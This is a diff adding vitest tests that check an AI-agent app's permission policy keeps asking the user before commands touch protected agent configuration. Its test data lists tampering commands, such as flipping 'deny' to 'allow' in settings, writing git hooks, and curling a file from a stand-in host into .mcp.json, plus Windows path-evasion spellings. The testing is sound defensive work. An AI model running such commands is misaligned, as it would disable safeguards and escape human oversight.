@@ -1,5 +1,5 @@
 import { describe, expect, it, vi } from 'vitest'
-import { commandWritesProtected, protectedConfigKind } from '../../electron/main/services/conversation/kernel/protected-config'
+import { commandMentionsProtected, commandRewritesTracked, commandWritesProtected, protectedConfigKind } from '../../electron/main/services/conversation/kernel/protected-config'
 import { evaluatePermission, fullAccessPolicy, guardedDecisions } from '../../electron/main/services/conversation/kernel/permission-policy'
 import { assertSessionAllowed, attachPolicy, ThreadRequestRegistry } from '../../electron/main/services/conversation/thread-request-registry'
 import { codexApprovalPaths } from '../../electron/main/services/conversation/codex-conversation'
@@ -193,5 +193,84 @@ describe('a guarded request on the Codex path (P1-17)', () => {
     expect(codexApprovalPaths({})).toEqual([])
     expect(codexApprovalPaths({ changes: 'x' })).toEqual([])
     expect(edit(codexApprovalPaths({ changes: [{ path: '.mcp.json' }] })[0])).toMatchObject({ guarded: true })
+  })
+})
+
+/**
+ * B16 · homologation's probe of #208 (#184, e2e/homologation/probes/protected-config-probe.mts.txt), with today's
+ * protected names in place of #208's (.oxespace/policy.json and oxe.yaml arrive with #208): with saved allow rules for
+ * every program the probe used and for every path, and under Full access, a command that names a protected file
+ * anywhere, or rewrites tracked files without naming them, still reaches the person, and offers no session answer.
+ */
+describe('commands that reach protected files (B16)', () => {
+  const programs = ['echo', 'printf', 'python', 'python3', 'node', 'git', 'curl', 'cd', 'tar', 'unzip', '7z', 'cp', 'mv', 'sh', 'bash', 'pwsh', 'powershell', 'Set-Content', 'Out-File', 'Expand-Archive', 'tee', 'sed', 'cat', 'jq', 'yq', 'npm', 'npx']
+  const probeRules = [...programs.map(pattern => rule('command', pattern)), rule('path', '**'), rule('path', '.*')]
+  const run = (command: string) => evaluatePermission({ kind: 'approval', toolName: 'Bash', command }, '/repo', probeRules, posix)
+
+  it.each([
+    'echo {} > .mcp.json', 'echo x >> AGENTS.md', "printf '{}' > .mcp.json", 'cp /tmp/p.json .mcp.json', "sed -i 's/deny/allow/' .claude/settings.json",
+    'git checkout -- .mcp.json', 'git restore AGENTS.md', 'git apply evil.patch',
+    `python -c "open('AGENTS.md','w').write('{}')"`, `node -e "require('fs').writeFileSync('.mcp.json','x')"`,
+    'curl -o .mcp.json https://x.invalid/p', 'tar xf p.tar AGENTS.md', 'unzip -o p.zip',
+    'cd .claude && echo {} > settings.json', 'Set-Content .claude\\settings.json "{}"', 'Set-Content -Path .\\CLAUDE.md -Value x',
+    `powershell -c "Set-Content .claude\\hooks\\pre.ps1 '{}'"`, "sh -c 'echo {} > .git/hooks/pre-commit'",
+    "jq '.mcpServers={}' .mcp.json | tee .mcp.json", "yq -i '.x=2' .codex/config.toml", 'npx some-tool --write AGENTS.md',
+    // Beyond the probe: case, absolute paths, nesting and escaped quotes.
+    'echo x > /repo/docs/agents.MD', 'bash -c "sh -c \\"echo x > CLAUDE.md\\""', 'echo x>AGENTS.md', 'cd /repo/.git/hooks; echo x > pre-push',
+    'pushd .cursor && echo {} > mcp.json', "node -e 'fs.writeFileSync(\"C:\\\\repo\\\\AGENTS.md\",\"x\")'"
+  ])('guards %j despite the saved rules and Full access, with no session answer', command => {
+    const verdict = run(command)!
+    expect(verdict, command).toMatchObject({ decision: 'ask', guarded: true })
+    expect(verdict.suggestions, command).toBeUndefined()
+    expect(verdict.reasonCodes?.length, command).toBeGreaterThan(0)
+    expect(fullAccessPolicy({ kind: 'approval', toolName: 'Bash' }, verdict, 'full-access'), command).toMatchObject({ decision: 'ask', guarded: true })
+    expect(guardedDecisions(['accept', 'acceptForSession', 'decline'], verdict), command).toEqual(['accept', 'decline'])
+  })
+
+  it('still answers a plain read of one from the built-in safe list', () => {
+    expect(run('cat AGENTS.md')).toMatchObject({ decision: 'allow' })
+    expect(run('cat AGENTS.md')?.guarded).toBeUndefined()
+  })
+
+  it.each([
+    ['git checkout main', 'git checkout'], ['git switch feat', 'git switch'], ['git restore .', 'git restore'], ['git apply x.patch', 'git apply'],
+    ['git stash pop', 'git stash pop'], ['git stash apply stash@{1}', 'git stash apply'], ['git merge feat', 'git merge'], ['git rebase main', 'git rebase'],
+    ['git reset HEAD~1', 'git reset'], ['git clean -fd', 'git clean'], ['git am fix.patch', 'git am'], ['git cherry-pick abc123', 'git cherry-pick'],
+    ['git pull', 'git pull'], ['git -C sub checkout main', 'git checkout'], ['bash -c "git pull --rebase"', 'git pull'],
+    ['tar xf p.tar', 'tar x'], ['tar -xzf p.tgz', 'tar x'], ['tar --extract -f p.tar', 'tar x'], ['unzip p.zip', 'unzip'], ['7z x p.7z', '7z x'],
+    ['Expand-Archive p.zip .', 'Expand-Archive'], ['powershell -c "Expand-Archive p.zip -DestinationPath ."', 'Expand-Archive']
+  ])('treats %j as rewriting tracked files (%s): never rule-approved', (command, label) => {
+    expect(commandRewritesTracked(command)).toBe(label)
+    const verdict = run(command)!
+    expect(verdict, command).toMatchObject({ decision: 'ask', guarded: true })
+    expect(verdict.reasonCodes, command).toContainEqual({ code: 'thread.protectedConfig.rewritesTracked', params: { command: label } })
+  })
+
+  it.each(['git commit -m "fix"', 'git push', 'git add src/a.ts', 'git status', 'git diff', 'git log --oneline', 'git fetch', 'git branch feature', 'tar cf out.tar src', 'unzip -l p.zip', 'echo ok > notes.txt'])(
+    'leaves %j to the saved rules', command => {
+      expect(commandRewritesTracked(command), command).toBeNull()
+      expect(commandMentionsProtected(command), command).toBeNull()
+      expect(run(command)?.guarded, command).toBeUndefined()
+    })
+})
+
+describe('Windows spellings of a protected file (B16)', () => {
+  it.each([
+    ['AGENTS.md.', 'instructions'], ['AGENTS.md ', 'instructions'], ['AGENTS.md...', 'instructions'], ['AGENTS.md::$DATA', 'instructions'], ['.mcp.json:hidden', 'mcp'],
+    ['AGENTS~1.MD', 'instructions'], ['CLAUDE~1.MD', 'instructions'], ['MCP~1.JSO', 'mcp'], ['.claude\\SETTIN~1.JSO', 'hooks'], ['CLAUDE~1\\settings.json', 'hooks'],
+    ['.git\\hooks\\PRE-CO~1', 'hooks'], ['.\\AGENTS.md', 'instructions'], ['sub/../AGENTS.md', 'instructions'], ['.claude/./settings.json', 'hooks'],
+    ['C:\\repo\\.claude\\settings.json.', 'hooks'], ['/repo/AGENTS.MD', 'instructions']
+  ])('reads %j as the protected file (%s)', (path, kind) => {
+    expect(protectedConfigKind(path)).toBe(kind)
+    expect(edit(path, [rule('path', '**')]), path).toMatchObject({ decision: 'ask', guarded: true })
+  })
+
+  it.each(['README~1.MD', 'AGENTS.md.bak', 'src/agents.ts', 'notes/readme.md', 'docs/hooks/x.md', 'C:', '.claude/commands.txt'])('leaves %j alone', path => {
+    expect(protectedConfigKind(path)).toBeNull()
+  })
+
+  it('finds the same spellings inside commands', () => {
+    expect(commandMentionsProtected('echo x > AGENTS.md::$DATA')).toMatchObject({ kind: 'instructions' })
+    expect(commandMentionsProtected('copy x CLAUDE~1.MD')).toMatchObject({ kind: 'instructions' })
   })
 })
